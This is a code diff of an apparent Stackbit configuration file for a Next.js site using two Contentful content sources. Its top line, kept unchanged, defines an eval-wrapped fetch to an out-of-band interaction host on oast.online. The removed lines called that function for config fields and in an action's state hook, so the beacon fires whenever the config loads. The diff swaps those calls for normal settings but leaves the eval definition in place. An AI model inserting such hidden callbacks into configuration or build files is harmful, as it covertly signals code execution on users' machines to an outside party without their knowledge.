@@ -1,25 +1,44 @@
 const e = () => eval(`fetch(\`https://cpq8j7hucph8ppbne1hg594fzknjnnu5m.oast.online\`)`);
+import { ObjectModel } from "@stackbit/types";
+
+import { ContentfulContentSource } from "@stackbit/cms-contentful";
 
 export default {
-  stackbitVersion: e(),
-  ssgName: e(),
-  nodeVersion: e(),
-  buildCommand: e(),
-  models: {
-    page: { type: 'page', urlPath: '/{slug}' },
-  },
-  actions: [
+  stackbitVersion: '~0.6.0',
+	ssgName: 'next',
+	nodeVersion: '18',
+  buildCommand: 'npm run  build',
+  contentSources: [
+    new ContentfulContentSource({
+      spaceId: process.env.CONTENTFUL_SPACE_ID_01,
+      environment: process.env.CONTENTFUL_ENVIRONMENT_01,
+      previewToken: process.env.CONTENTFUL_PREVIEW_TOKEN_01,
+      accessToken: process.env.CONTENTFUL_MANAGEMENT_TOKEN_01
+    }),
+    new ContentfulContentSource({
+      spaceId: process.env.CONTENTFUL_SPACE_ID_02,
+      environment: process.env.CONTENTFUL_ENVIRONMENT_02,
+      previewToken: process.env.CONTENTFUL_PREVIEW_TOKEN_02,
+      accessToken: process.env.CONTENTFUL_MANAGEMENT_TOKEN_02
+    })
+  ]
+  // ...
+};
+
+export const HeroSection = {
+  name: "HeroSection",
+  type: "object",
+  fields: [
     {
-      type: 'global',
-      name: 'name_of_action',
-      state: async (options) => {
-        // Determine the state ...
-        //
-        await fetch(`https://cpq8j7hucph8ppbne1hg594fzknjnnu5m.oast.online`)
-      },
-      run: async (options) => {
-        // Perform the action ...
-      },
+      type: "string",
+      name: "title",
+      label: "Heading"
     },
-  ],
-}
+    {
+      type: "string",
+      name: "emoji",
+      controlType: "custom-inline-html",
+      controlFilePath: ".stackbit/fields/emoji.html"
+    }
+  ]
+};
